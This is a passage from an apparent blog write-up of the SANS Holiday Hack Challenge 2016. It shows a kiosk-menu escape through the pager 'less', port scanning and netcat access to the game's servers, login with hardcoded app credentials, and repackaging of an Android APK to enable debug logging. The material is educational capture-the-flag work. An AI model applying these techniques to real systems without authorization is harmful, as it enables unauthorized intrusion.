&lt;p&gt;Passphrase: &lt;code&gt;WUMPUS IS MISUNDERSTOOD&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This passphrase gives you an access to a room called DFER, where there's no
terminal.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="train-station"&gt;
&lt;h3&gt;Train station&lt;/h3&gt;
&lt;p&gt;You're given access to a kiosk menu to control the train:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
Train Management Console: AUTHORIZED USERS ONLY
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&amp;gt;
&lt;/pre&gt;
&lt;p&gt;If you want to start the train, you must release the brakes, and know the
correct passphrase:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&amp;gt; BRAKEOFF
*******CAUTION*******
The brake has been released!
*******CAUTION*******
off
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&amp;gt; START
Checking brakes....
Enter Password:
&lt;/pre&gt;
&lt;p&gt;Let's see how we can find this password.&lt;/p&gt;
&lt;p&gt;If you take a look at the &lt;code&gt;HELP&lt;/code&gt; function, you can see that it's opening
a help file. The clue in the description of the &lt;code&gt;HELP&lt;/code&gt; function
(&amp;quot;un&lt;strong&gt;LESS&lt;/strong&gt; you know something I don't&amp;quot;), plus the name of the file at the
bottom of the screen, is a strong indicator that the menu is using the
&lt;code&gt;less&lt;/code&gt; command to open the help file:&lt;/p&gt;
&lt;img alt="help_command.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command.png" /&gt;
&lt;p&gt;By using the &lt;code&gt;:e&lt;/code&gt; command, we can examine another file than the one open.
By using tabulation auto-complete, we can see the name of the script used to
display the kiosk menu, &lt;code&gt;Train_Console&lt;/code&gt;:&lt;/p&gt;
&lt;img alt="help_command_exploit.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command_exploit.png" /&gt;
&lt;img alt="help_command_exploit_train_console_script.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command_train_console_script.png" /&gt;
&lt;p&gt;Passphrase: &lt;code&gt;24fb3e89ce2aa0ea422c3d511d40dd84&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;By starting the train, we can see that we can travel to the past, in 1978!&lt;/p&gt;
&lt;img alt="train_back_to_the_future.png" class="align-center" src="/images/sans-christmas-challenge-2016/train_back_to_the_future.png" /&gt;
&lt;p&gt;We then arrive in the North Pole, but in 1978:&lt;/p&gt;
&lt;img alt="north_pole_1978.png" class="align-center" src="/images/sans-christmas-challenge-2016/north_pole_1978.png" /&gt;
&lt;p&gt;We can go, in 1978, into every room that we unlocked in 2016. By doing so, we
find Santa in the DFER (&amp;quot;Dungeon For Errant Reindeer&amp;quot;) room:&lt;/p&gt;
&lt;img alt="found_santa.png" class="align-center" src="/images/sans-christmas-challenge-2016/found_santa.png" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-4-my-gosh-it-s-full-of-holes"&gt;
&lt;h2&gt;Part 4: My Gosh... It's Full of Holes&lt;/h2&gt;
&lt;p&gt;Well, we've found Santa, Christmas is saved, hurray! But the abductor is still
roaming free. And since Santa is suffering from short-term memory loss because
of the fight, he doesn't remember who attacked him. So, who is behind Santa's
attack, and where can we find them? By taking a look at the SantaGram
application, we may find some interesting informations.&lt;/p&gt;
&lt;p&gt;We're looking for servers the SantaGram application interacts with. By looking
at the resource file in the decompiled APK, we can find several URLs:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
0x7f070015 (2131165205) = string.analytics_launch_url: https://analytics.northpolewonderland.com/report.php?type=launch
0x7f070016 (2131165206) = string.analytics_usage_url: https://analytics.northpolewonderland.com/report.php?type=usage
[...]
0x7f07001a (2131165210) = string.banner_ad_url: http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5
[...]
0x7f07001d (2131165213) = string.debug_data_collection_url: http://dev.northpolewonderland.com/index.php
[...]
0x7f07001f (2131165215) = string.dungeon_url: http://dungeon.northpolewonderland.com/
0x7f070020 (2131165216) = string.exhandler_url: http://ex.northpolewonderland.com/exception.php
&lt;/pre&gt;
&lt;p&gt;This gives us a total of five servers to target:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;analytics.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;ads.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;dev.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;dungeon.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;ex.northpolewonderland.com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can confirm with the Great and Powerful Oracle, Tom Hessman, that these are
indeed, the servers to target:&lt;/p&gt;
&lt;img alt="tom_hessman.png" class="align-center" src="/images/sans-christmas-challenge-2016/tom_hessman.png" /&gt;
&lt;p&gt;Alright, let the hacking begin!&lt;/p&gt;
&lt;div class="section" id="the-mobile-analytics-server-via-credentialed-login-access"&gt;
&lt;h3&gt;&lt;a class="reference external" href="https://analytics.northpolewonderland.com/"&gt;The Mobile Analytics Server (via credentialed login access)&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;For the first part of this server, you only need to log in with the credentials
found in the decompiled APK, &lt;code&gt;guess/busyreindeer78&lt;/code&gt;. Once you're
connected, you can download the wanted audio file:&lt;/p&gt;
&lt;img alt="first_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/first_audio_file.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-dungeon-game"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://dungeon.northpolewonderland.com/"&gt;The Dungeon Game&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The web server of the Dungeon game gives us instructions on how to play. A
mischievous Elf is said to trade secrets for gifts. If we give him a gift, he
may help us find the villain!&lt;/p&gt;
&lt;p&gt;However, we can't seem to start a party on the web page. Similarly as last
year, and since an elf in the North Pole hints to do so, I suspected there was
another open port, on which we could connect to play the Dungeon game:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nmap dungeon.northpolewonderland.com

Starting Nmap 6.47 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2016-12-29 21:58 CET
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; dungeon.northpolewonderland.com &lt;span class="o"&gt;(&lt;/span&gt;35.184.47.139&lt;span class="o"&gt;)&lt;/span&gt;
Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.12s latency&lt;span class="o"&gt;)&lt;/span&gt;.
rDNS record &lt;span class="k"&gt;for&lt;/span&gt; 35.184.47.139: 139.47.184.35.bc.googleusercontent.com
Not shown: &lt;span class="m"&gt;994&lt;/span&gt; closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
&lt;span class="hll"&gt;11111/tcp open     vce
&lt;/span&gt;
Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 16.09 seconds
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The last port is not a standard one, let's connect to it with &lt;code&gt;nc&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc dungeon.northpolewonderland.com 11111
Welcome to Dungeon.         This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As suspected, it's an interface to the Dungeon game. That's when I decided to
brush up a little bit on it (instead of just posting a link to the Wikipedia
article as I did in Part 1). It's a text-based RPG, inspired by Dungeons and
Dragons. It's apparently strongly tied to the famous &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Zork"&gt;Zork&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So I started searching for &lt;cite&gt;*cough cough*&lt;/cite&gt; write-through of Zork and found
&lt;a class="reference external" href="http://www.lacegem.com/solutions/zork1.html"&gt;this one&lt;/a&gt;. It's not really
necessary, but it gave me the idea to go up the chimney.&lt;/p&gt;
&lt;p&gt;Anyway, here's how to get the wanted information:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;Welcome to Dungeon.         This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are facing the south side of a white house.  There is no door here,
and all the windows are barred.
&lt;span class="hll"&gt;&amp;gt;east
&lt;/span&gt;You are behind the white house.  In one corner of the house
there is a window which is slightly ajar.
&lt;span class="hll"&gt;&amp;gt;open window
&lt;/span&gt;With great effort, you open the window far enough to allow passage.
&lt;span class="hll"&gt;&amp;gt;go in
&lt;/span&gt;You are in the kitchen of the white house.  A table seems to have
been used recently for the preparation of food.  A passage leads to
the west, and a dark staircase can be seen leading upward.  To the
east is a small window which is open.
On the table is an elongated brown sack, smelling of hot peppers.
A clear glass bottle is here.
The glass bottle contains:
  A quantity of water.
&lt;span class="hll"&gt;&amp;gt;west
&lt;/span&gt;You are in the living room.  There is a door to the east.  To the west
is a wooden door with strange gothic lettering, which appears to be
nailed shut.
In the center of the room is a large oriental rug.
There is a trophy case here.
On hooks above the mantlepiece hangs an elvish sword of great antiquity.
A battery-powered brass lantern is on the trophy case.
There is an issue of US NEWS &amp;amp; DUNGEON REPORT dated 11-MAR-78 here.
&lt;span class="hll"&gt;&amp;gt;take lantern
&lt;/span&gt;Taken.
&lt;span class="hll"&gt;&amp;gt;turn lantern on
&lt;/span&gt;The lamp is now on.
&lt;span class="hll"&gt;&amp;gt;move rug
&lt;/span&gt;With a great effort, the rug is moved to one side of the room.
With the rug moved, the dusty cover of a closed trap door appears.
&lt;span class="hll"&gt;&amp;gt;open trap door
&lt;/span&gt;The door reluctantly opens to reveal a rickety staircase descending
into darkness.
&lt;span class="hll"&gt;&amp;gt;go down
&lt;/span&gt;You are in a dark and damp cellar with a narrow passageway leading
east, and a crawlway to the south.  To the west is the bottom of a
steep metal ramp which is unclimbable.
The door crashes shut, and you hear someone barring it.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are on the west edge of a chasm, the bottom of which cannot be
seen.  The east side is sheer rock, providing no exits.  A narrow
passage goes west.  The path you are on continues to the north and south.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are in an art gallery.  Most of the paintings which were here
have been stolen by vandals with exceptional taste.  The vandals
left through the north, south, or west exits.
Fortunately, there is still one chance for you to be a vandal, for on
the far wall is a work of unparalleled beauty.
&lt;span class="hll"&gt;&amp;gt;take painting
&lt;/span&gt;Taken.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are in what appears to have been an artist&amp;#39;s studio.  The walls
and floors are splattered with paints of 69 different colors.
Strangely enough, nothing of value is hanging here.  At the north and
northwest of the room are open doors (also covered with paint).  An
extremely dark and narrow chimney leads up from a fireplace.  Although
you might be able to get up the chimney, it seems unlikely that you
could get back down.
&lt;span class="hll"&gt;&amp;gt;go up
&lt;/span&gt;You have mysteriously reached the North Pole.
In the distance you detect the busy sounds of Santa&amp;#39;s elves in full
production.

You are in a warm room, lit by both the fireplace but also the glow of
centuries old trophies.
On the wall is a sign:
        Songs of the seasons are in many parts
        To solve a puzzle is in our hearts
        Ask not what what the answer be,
        Without a trinket to satisfy me.
The elf is facing you keeping his back warmed by the fire.
&lt;span class="hll"&gt;&amp;gt;give painting to elf
&lt;/span&gt;The elf, satisified with the trade says -
&lt;span class="hll"&gt;send email to &amp;quot;peppermint@northpolewonderland.com&amp;quot; for that which you seek.
&lt;/span&gt;The elf says - you have conquered this challenge - the game will now end.
Your score is 89 [total of 585 points], in 16 moves.
This gives you the rank of Novice Adventurer.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We're given instructions to send a mail to &lt;a class="reference external" href="mailto:peppermint&amp;#64;northpolewonderland.com"&gt;peppermint&amp;#64;northpolewonderland.com&lt;/a&gt;
to receive the information we seek. After sending an email, we get an answer:&lt;/p&gt;
&lt;img alt="dungeon_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/dungeon_audio_file.png" /&gt;
&lt;p&gt;We now have our third weird audio file.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-debug-server"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://dev.northpolewonderland.com/index.php"&gt;The Debug Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;If we look at the decompiled source code of the SantaGram application, we can
see that the debug server is called when a user modifies their own profile:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File com/northpolewonderland/santagram/EditProfile.java&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;debug_data_enabled&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;    &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;i&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;TAG&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Remote debug logging is Enabled&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;i&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;TAG&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Remote debug logging is Disabled&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SimpleDateFormat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;yyyyMMddHHmmssZ&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Calendar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getInstance&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getTime&lt;/span&gt;&lt;span class="o"&gt;()));&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Secure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getContentResolver&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getCanonicalName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;, &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSimpleName&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;totalMemory&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;freeMemory&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
        &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Runnable&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="cm"&gt;/* synthetic */&lt;/span&gt; &lt;span class="n"&gt;EditProfile&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;                &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;debug_data_collection_url&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/span&gt;            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}).&lt;/span&gt;&lt;span class="na"&gt;start&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;e&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;TAG&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Error posting JSON debug data: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMessage&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, to do so, debug mode must be enabled in the application. To check
this, the application compares the string &lt;code&gt;debug_data_enabled&lt;/code&gt; in the
application resource's to &lt;code&gt;true&lt;/code&gt;. Let's take a look at the resources:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;&amp;lt;!-- File res/values/strings.xml --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;string&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;debug_data_enabled&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;false&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Debug data are disabled. So we need to modify the resource file of the
application in order to enable it. Luckily, this is something we often have
to do in my day job: more and more of our clients are implementing &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Certificate_pinning"&gt;TLS
certificate pinning&lt;/a&gt;
in their mobile applications, which prevents us from intercepting the tested
application's communication with Burp.  This means that we have to decompile
the application, patch the certificate pinning code, recompile, then reinstall
the application. This is kind of what we have to do here, except instead of
patching the certificate pinning code, we just have to modify the resource file
to enable debug data.&lt;/p&gt;
&lt;p&gt;I'm basically going to use &lt;a class="reference external" href="http://blog.dewhurstsecurity.com/2015/11/10/mobile-security-certificate-pining.html"&gt;this excellent tutorial&lt;/a&gt;
to patch the application and rebuild it without any problem.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# First, we&amp;#39;re disassembling the application&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;apktool d ./SantaGram_4.2.apk -o SantaGram_4.2_disassembled
I: Using Apktool 2.2.1 on SantaGram_4.2.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
&lt;span class="c"&gt;# Now, we modify our resource file&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;sed -i &lt;span class="s1"&gt;&amp;#39;s/&amp;lt;string name=&amp;quot;debug_data_enabled&amp;quot;&amp;gt;false/&amp;lt;string name=&amp;quot;debug_data_enabled&amp;quot;&amp;gt;true/g&amp;#39;&lt;/span&gt; SantaGram_4.2_disassembled/res/values/strings.xml
&lt;span class="nv"&gt;$ &lt;/span&gt;grep &lt;span class="s1"&gt;&amp;#39;debug_data_enabled&amp;#39;&lt;/span&gt; SantaGram_4.2_disassembled/res/values/strings.xml
    &amp;lt;string &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug_data_enabled&amp;quot;&lt;/span&gt;&amp;gt;true&amp;lt;/string&amp;gt;
&lt;span class="c"&gt;# Now, we&amp;#39;re rebuilding our application&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;apktool b ./SantaGram_4.2_disassembled -o SantaGram_4.2_debug.apk
I: Using Apktool 2.2.1
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
&lt;span class="c"&gt;# In order to be able to install our new APK, we must sign it, check the above&lt;/span&gt;
&lt;span class="c"&gt;# tutorial for instructions&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize &lt;span class="m"&gt;2048&lt;/span&gt; -validity 10000
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore SantaGram_4.2_debug.apk alias_name
Enter Passphrase &lt;span class="k"&gt;for&lt;/span&gt; keystore:
jar signed.

Warning:
No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s expiration date &lt;span class="o"&gt;(&lt;/span&gt;2044-05-14&lt;span class="o"&gt;)&lt;/span&gt; or after any future revocation date.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a &lt;code&gt;SantaGram_4.2_debug.apk&lt;/code&gt; file, that we can install on our
phone. This application has debugging enabled, which means that we'll see
communication with the debug server.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&amp;lt;reminder&amp;gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Even though communications with the debug server is done in plain
text, the application communicates with the
&lt;a class="reference external" href="https://www.northpolewonderland.com/"&gt;https://www.northpolewonderland.com/&lt;/a&gt; application. Since it's TLS-encrypted, and
the application checks the validity of the certificate, you must import your
intercepting proxy's CA certificate in your telephone. Just a reminder that
Android phones can only import PEM, and that by default Burp exports its CA
certificate in DER. You can use the following OpenSSL command to convert it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;openssl x509 -inform der -in ./burpca.der -out burpca.pem
&lt;/pre&gt;&lt;/div&gt;
